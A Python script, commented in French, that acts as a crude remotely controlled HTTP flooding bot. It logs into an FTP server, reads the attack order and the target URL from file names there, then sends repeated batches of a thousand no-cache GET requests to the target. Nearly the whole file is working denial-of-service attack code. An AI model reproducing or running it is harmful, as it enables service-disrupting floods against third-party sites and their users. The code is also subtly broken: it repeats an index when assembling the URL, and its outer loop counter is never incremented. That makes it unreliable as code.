from ftplib import FTP_TLS
from os import system
import requests
import time
import progressbar

ftp=FTP_TLS()
ftp.set_debuglevel(2)
ftp.connect('IciEntrezAdresseIp')
ftp.sendcmd('USER IciEntrezUserNameFtp')
ftp.sendcmd('PASS IciEntrezPasswordFtp')
files = []
ftp.dir(files.append) #Nous listons les fichiers présents sur le serveur ftp
print(files)
file=files
requete = file[3] #Nous récupérons la 3ème entrée qui contient le fichier possédant l'ordre souhaité en son nom, (ATTENTION /  dans cet exemple, l'entrée [2] Correspond à default_index.html qui est inséré automatiquement, si ce n'est pas le cas pour vous, mettez ici [2] et sur la variable juste en dessous mettez [3]
requeteurl = file[4] #Nous récupérons la cible, la 4eme entrée contient un fichier au nom de l'url cible, exemple : www.google.com (ATTENTION : ne pas mettre http:// , il sera automatiquement ajouté par la suite)
objectif = requete[62] + requete[63] + requete[64] + requete[65] + requete[66] +requete[67] #Nous récupérons l'objectif (la 3eme entrée) qui contient 6 caractères max, ici l'objectif est ping, le fichier s'appelle donc ping.. 
print(objectif)

if objectif == ("ping.."):
	h = {
    "Cache-Control": "no-cache", "Pragma": "no-cache"
	} #Nous rechargons complètement la page à chaque requête
	compteur = 0
	tour = 0
	#Ci dessous, nous récupérons 39 caractères, ce qui est la limite de taille de l'url cible, le fichier contenant l'url cible doit contenir 39 caractères, si il fait 10 caractères, les 29 caractères restants devront être des tirets du 8 "_" , exemple : www.google.com________________________
	url0 = requeteurl[62] + requeteurl[63] + requeteurl[64] + requeteurl[65] + requeteurl[66] +requeteurl[67] + requeteurl[68] + requeteurl[69] + requeteurl[70] + requeteurl[71] + requeteurl[72] + requeteurl[73]  + requeteurl[74] + requeteurl[75] + requeteurl[76] + requeteurl[77] + requeteurl[78] + requeteurl[79] + requeteurl[80] + requeteurl[81] + requeteurl[82] + requeteurl[83] + requeteurl[84] + requeteurl[85] + requeteurl[86] + requeteurl[87] + requeteurl[73] + requeteurl[88] + requeteurl[89] + requeteurl[90] + requeteurl[91] + requeteurl[92] + requeteurl[93] + requeteurl[94] + requeteurl[95] + requeteurl[96] + requeteurl[97] + requeteurl[98] + requeteurl[99] + requeteurl[100] + requeteurl[101]
	url0 = str(url0)
	url1 = url0.split('_') #Ici nous supprimons les tirets du 8 (les caractères de trop)
	url1 = url1[0]
	print(url1)
	urlcible = url1
	urlcible = "https://" + urlcible 
	while tour < 10:
		#Ici une boucle relancera 10 fois 1000 requêtes, vous pouvez insérez ici un ping par exemple afin de voir l'état du serveur toutes les X requêtes (ATTENTION : Il n'y a ni user agent, ni référent, autrement dit vous n'êtes pas sensés utiliser ce code puisque d'autres bien plus évolués existent déjà)
		print("Envoi de 1000 requêtes")	
		while compteur < 1000:
			for i in progressbar.progressbar(range(1000)):
				request = requests.get(urlcible, headers=h)
				compteur = compteur + 1
				#Une requête est envoyée à chaque boucle
